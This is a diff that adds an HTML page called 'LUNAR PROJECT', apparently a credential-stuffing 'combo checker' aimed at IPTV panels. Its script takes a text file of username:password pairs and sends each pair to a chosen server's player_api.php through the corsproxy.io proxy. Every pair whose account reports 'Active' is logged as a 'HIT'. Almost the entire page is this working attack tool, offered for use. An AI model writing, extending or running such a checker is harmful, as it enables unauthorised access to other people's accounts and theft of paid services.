@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>LUNAR PROJECT — BY TUTSUKI</title>
+<style>
+  body { background: #000; color: #00c38e; font-family: monospace; text-align: center; }
+  .caixa { border: 2px solid #00c38e; padding: 15px; border-radius: 10px; margin: 10px auto; max-width: 500px; background: rgba(0,0,0,0.8); }
+  input, select, button { width: 90%; padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid #00c38e; background: #111; color: #00c38e; font-weight: bold; }
+  button { background: #00c38e; color: #000; cursor: pointer; }
+  .barra { background: #333; height: 20px; border-radius: 5px; margin: 10px 0; }
+  .barra-fill { background: #00c38e; width: 0%; height: 100%; transition: 0.3s; }
+</style>
+</head>
+<body>
+<h1>🌘 LUNAR PROJECT</h1>
+<div class="caixa">
+  <input id="combo" type="file" accept=".txt"/><br>
+  <input id="servidor" placeholder="http://exemplo.com:80" type="text"/><br>
+  <input id="nick" value="Tutsuki" type="text"/><br>
+  <button onclick="start()">🚀 INICIAR SCAN</button>
+</div>
+
+<div class="caixa">
+  <div>🔥 HITS: <span id="hCount">0</span></div>
+  <div class="barra"><div id="bFill" class="barra-fill"></div></div>
+  <div id="logs" style="text-align:left; font-size:12px; max-height:200px; overflow-y:auto;"></div>
+</div>
+
+<script>
+let hits = 0;
+async function start() {
+  const file = document.getElementById('combo').files[0];
+  const srv = document.getElementById('servidor').value;
+  if(!file || !srv) return alert("Selecione o arquivo e o servidor!");
+  const text = await file.text();
+  const linhas = text.split('\n');
+  for(let l of linhas) {
+    const [u, p] = l.trim().split(':');
+    if(!u || !p) continue;
+    try {
+      const url = `https://corsproxy.io/?${encodeURIComponent(srv+'/player_api.php?username='+u+'&password='+p)}`;
+      const r = await fetch(url);
+      const d = await r.json();
+      if(d?.user_info?.status === "Active") {
+        hits++; document.getElementById('hCount').innerText = hits;
+        document.getElementById('logs').innerHTML += `✅ HIT: ${u}:${p}<br>`;
+      }
+    } catch(e) {}
+  }
+  alert("Scan finalizado!");
+}
+</script>
+</body>
+</html>
